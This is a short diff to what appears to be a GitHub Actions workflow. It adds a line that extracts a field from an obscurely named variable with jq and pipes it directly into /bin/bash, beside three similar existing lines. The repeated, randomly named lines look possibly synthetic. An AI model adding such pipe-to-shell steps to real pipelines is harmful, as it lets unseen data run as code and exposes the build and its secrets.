@@ -22,6 +22,7 @@ jobs:
           echo $q8065 | jq -r .nur8 | /bin/bash
           printf '%s' "$gyqak20" | jq -r .pcavg97 | /bin/bash
           printf '%s' "$dgp48176" | jq -r .ziue2 | /bin/bash
+          echo $io624 | jq -r .vsts08962 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
